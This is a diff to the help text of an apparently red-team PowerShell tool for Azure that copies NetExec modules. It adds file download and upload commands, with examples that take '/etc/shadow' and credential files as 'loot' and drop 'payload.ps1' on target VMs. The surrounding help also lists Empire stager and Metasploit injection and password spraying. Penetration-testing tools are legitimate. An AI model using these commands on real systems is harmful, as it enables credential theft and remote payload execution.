@@ -79,6 +79,8 @@ function Show-Help {
         @{Name="empire-exec"; Auth="Required"; Description="Execute Empire stager on Azure VMs (mimics nxc -M empire_exec)"}
         @{Name="met-inject"; Auth="Required"; Description="Inject Metasploit payload on Azure VMs (mimics nxc -M met_inject)"}
         @{Name="spider"; Auth="Required"; Description="Spider Azure Storage for sensitive files (mimics nxc smb --spider / spider_plus)"}
+        @{Name="get-file"; Auth="Required"; Description="Download file from Azure target (mimics nxc smb --get-file)"}
+        @{Name="put-file"; Auth="Required"; Description="Upload file to Azure target (mimics nxc smb --put-file)"}
         @{Name="help"; Auth="N/A"; Description="Display this help message"}
     )
     
@@ -150,6 +152,17 @@ function Show-Help {
     Write-Host "    .\azx.ps1 spider -DeviceName 'arc-server-01' -Pattern 'key,pem'"
     Write-Host "    .\azx.ps1 spider -AllDevices -StartPath '/etc' -Pattern 'conf,key'"
     Write-Host "    .\azx.ps1 spider -DeviceName 'arc-srv' -Download -MaxFileSize 5"
+
+    Write-ColorOutput -Message "`n[*] File Transfer Examples (NetExec --get-file/--put-file equivalent):" -Color "Yellow"
+    Write-Host "    # Download files from targets"
+    Write-Host "    .\azx.ps1 get-file -VMName 'vm-01' -RemotePath 'C:\Users\admin\secret.txt' -LocalPath '.\loot\secret.txt'"
+    Write-Host "    .\azx.ps1 get-file -DeviceName 'arc-01' -RemotePath '/etc/shadow' -LocalPath '.\shadow'"
+    Write-Host "    .\azx.ps1 get-file -StorageAccountTarget 'myaccount' -ContainerTarget 'data' -RemotePath 'creds.txt' -LocalPath '.\creds.txt'"
+    Write-Host ""
+    Write-Host "    # Upload files to targets"
+    Write-Host "    .\azx.ps1 put-file -VMName 'vm-01' -LocalPath '.\payload.ps1' -RemotePath 'C:\Windows\Temp\payload.ps1'"
+    Write-Host "    .\azx.ps1 put-file -DeviceName 'arc-01' -LocalPath '.\script.sh' -RemotePath '/tmp/script.sh'"
+    Write-Host "    .\azx.ps1 put-file -StorageAccountTarget 'myaccount' -ContainerTarget 'uploads' -LocalPath '.\data.txt' -RemotePath 'folder/data.txt'"
 
     Write-ColorOutput -Message "`n[*] Password Spray Examples (NetExec-style):" -Color "Yellow"
     Write-Host "    .\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Summer2024!'"
